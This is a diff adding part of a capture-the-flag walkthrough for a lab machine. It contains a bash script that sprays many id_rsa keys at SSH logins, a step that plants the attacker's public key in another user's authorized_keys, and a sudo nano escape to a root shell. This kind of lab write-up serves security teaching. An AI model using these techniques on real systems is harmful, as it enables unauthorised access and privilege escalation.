@@ -213,9 +213,108 @@ drwxr-xr-x 3 n16hth4wk n16hth4wk 4096 Feb 22 22:47 ..
 ```
 wow! 😧 these are lots of id_rsa key files, we either run it manually or script our way out. let's write a script that automate this for us.
 
+```
+#!/bin/bash
+#a simple automatic ssh login using id_rsa 
+#
+read -p "Enter Username: " user
 
+if [ -z "$user" ]
+then
+        echo "[+] Simple autossh Script"
+        echo "[-] Are you drunk? supply a username" 
+        exit 0
+fi
 
+#if username is specified 
+#
+for i in id_rsa*
+do 
+        echo $i
+        ssh -p 1055 -o "PreferredAuthentications=publickey" $user@10.150.150.55 -i $i
+done
+```
+now we have a script, dont forget to make it executable with `chmod +x script.sh`.
 
+![image](https://user-images.githubusercontent.com/87468669/220805119-743978f2-9236-4120-aa3d-575f9d4f677f.png)
 
+remember in the `/etc/passwd` file, these are the users available.
 
+```
+gary
+john
+sally
+alice
+```
+Now let's run our script and input username gary first.
+
+![image](https://user-images.githubusercontent.com/87468669/220806191-2083884d-9bf8-4530-b36c-ddb837df1f59.png)
+
+cool we are in as `gary`, let's keep running the script on other users and try escalate privs with this user. After much playing around, got nothing.
+
+![image](https://user-images.githubusercontent.com/87468669/220808581-da44ebb0-da5c-4199-8665-daed95721b2a.png)
+
+while running the script we logged in as user `sally`. let's try escalate privs.
+
+```
+sally@ubuntu:/home/john$ cd .ssh/
+sally@ubuntu:/home/john/.ssh$ ls -al
+total 12
+drwxrwx---  2 john netAdmin 4096 Jul  4  2020 .
+drwxr-xr-x 14 john john     4096 Jul  1  2020 ..
+-rw-rw-r--  1 john netAdmin 1118 Jul  4  2020 authorized_keys
+sally@ubuntu:/home/john/.ssh$ id
+uid=1003(sally) gid=1003(sally) groups=1003(sally),1006(netAdmin)
+```
+we can see we have access to john `.ssh` dir, let put our local pub key content in the `authorized_keys`.
+
+```
+sally@ubuntu:/home/john/.ssh$ ls -al
+total 20
+drwxrwx---  2 john  netAdmin 4096 Feb 23 11:11 .
+drwxr-xr-x 14 john  john     4096 Jul  1  2020 ..
+-rw-rw-r--  1 john  netAdmin 1118 Jul  4  2020 authorized_keys
+-rw-------  1 sally sally    2602 Feb 23 11:11 id_rsa
+-rw-r--r--  1 sally sally     566 Feb 23 11:11 id_rsa.pub
+sally@ubuntu:/home/john/.ssh$ nano authorized_keys
+sally@ubuntu:/home/john/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj86vaHjP5PJz/y1QNNidOTXXLq1s+LcBUbh5Xp3ebH9pZBVZe/kI2m1rG7SDhPIJUBOViodr4gmdLeXqupxmlNVfqHXr02HJB+YWjVieDRkDeuehvGSOb+bPuDDcJWOfhIevbsBW9nYK7Y+lAONEF31OwsS9QnB5lIOaTU5cwnjtJQul5xrityC02kQ/5aCLtb0mF4xKuez3pIBe1CBEyCB/3j7Rj0ibkTkiwseBuWXQi08oL7mTEs6HRmnr6CPsCw0diG1nbdxSRCOJM0nAzL9zZQ8SLEIncVq+sDO7oSfKSaTCV9cjVso0zHK5lrGdSD4jub95fDjteKjN59j5Q0tFeOFPmDdWecmrmmbFfQkU3bHjdPkB7FD7ycMtdwVJRSOvL6cOaKywdCZuqdWZokWUQIDdveIdTsDrpOyHW7g1Z9tWNP8hUQmrkIvfKkBTOAyHXiHBewyhldTWJfMp0b4Hy5/rzas9RYs5xKbmi74+51TIeZg7iShtmjDZ700E= n16hth4wk@n16hth4wk-sec
+sally@ubuntu:/home/john/.ssh$ 
+```
+cool 😺 now let's ssh as user john using our own `id_rsa` key.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/Silence/private]
+└─$ ssh -i ~/.ssh/id_rsa john@10.150.150.55 -p 1055
+Silence Please
+Last login: Sat Jul  4 02:27:27 2020 from 10.210.210.55
+$ /bin/bash
+john@ubuntu:~$ id 
+uid=1002(john) gid=1002(john) groups=1002(john),1006(netAdmin)
+john@ubuntu:~$ whoami
+john
+john@ubuntu:~$ 
+```
+Bull's eye 🎯 we got in as john. let's escalate privs 
+
+```
+john@ubuntu:~$ sudo -l
+Matching Defaults entries for john on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, logfile=/var/log/sudo.log
+
+User john may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/nano
+john@ubuntu:~$ 
+```
+by just doing `sudo -l` we can see that user john is allowed to run `/usr/bin/nano` as sudo without password. let's take advantage of this 
+
+```
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+
+![image](https://user-images.githubusercontent.com/87468669/220812034-ab80a103-9985-4cc3-af03-75df591e3b35.png)
+
+running the command above droped us in a root shell. And we are through
 
